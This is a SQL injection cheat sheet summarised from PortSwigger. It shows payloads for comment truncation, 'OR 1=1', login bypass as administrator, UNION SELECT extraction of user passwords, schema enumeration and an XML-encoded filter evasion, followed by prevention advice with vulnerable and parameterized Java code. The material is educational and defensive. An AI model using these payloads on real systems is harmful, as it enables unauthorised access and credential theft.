# SQLi Cheatsheet

**Source:** PortsSwigger (summary)

---

### What is SQLi
SQL Injection (SQLi) lets an attacker manipulate SQL queries executed by an application.

---

### Retrieving hidden data
Example request:
```
https://insecure-website.com/products?category=Gifts
```
Original query:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
Injection:
```
https://insecure-website.com/products?category=Gifts'--
```
Becomes:
```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```
`--` comments out the rest of the query.

Using `OR`:
```
?category=Gifts'+OR+1=1--
```
→ returns all rows (1=1 is always true). Beware with UPDATE/DELETE.

---

### Auth bypass (subverting logic)
If app runs:
```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```
Submitting username `administrator'--` yields:
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```
(password check removed).

---

### UNION to retrieve other tables
Original:
```sql
SELECT name, description FROM products WHERE category = 'Gifts'
```
Inject:
```
' UNION SELECT username, password FROM users--
```
Close the quote, inject `UNION`, comment out remainder.

---

### Blind SQLi
When results aren't returned, use boolean or time-based checks or OAST techniques to detect behavior.

---

## First vs Second-order SQLi
- **First-order:** input directly used in a query.  
- **Second-order:** input stored and later used unsafely in another query.

---

### Enumerating the DB
DBs differ; after finding SQLi, enumerate:
- Version (e.g., Oracle: `SELECT * FROM v$version`)  
- Tables: `SELECT * FROM information_schema.tables`

---

### SQLi in other input formats
Any input parsed into SQL is exploitable: URL params, JSON, XML, headers, cookies, etc.

Example XML encoding:
```xml
<stockCheck>
  <productId>123</productId>
  <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

---

### Quick tips & payloads
- Close opened quotes before injecting.  
- Use DB comment syntax (`--`, `#`, `/*...*/`).  
- Try `OR 1=1`, `UNION SELECT`, boolean/time payloads.  
- For blind SQLi use time delays or boolean checks.  
- Match column counts/types with `UNION SELECT`.

---

### Prevention (concise)
- Use **parameterized queries / prepared statements** — avoid string concatenation.
```java
// Vulnerable
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
// Safe
PreparedStatement ps = conn.prepareStatement("SELECT * FROM products WHERE category = ?");
ps.setString(1, input);
ResultSet rs = ps.executeQuery();
```
- Whitelist/validate input.  
- Use least-privilege DB accounts.  
- Disable verbose DB errors in production.  
- Consider WAFs and input encoding.

---

### Checklist
- Close quotes, inject, then comment.  
- Try `OR 1=1`, `UNION SELECT`, boolean/time payloads.  
- Enumerate schema via `information_schema`, `v$version`, etc.  
- Only test systems you are authorized to assess.

---

### Useful Resources
- https://portswigger.net/web-security/sql-injection/cheat-sheet
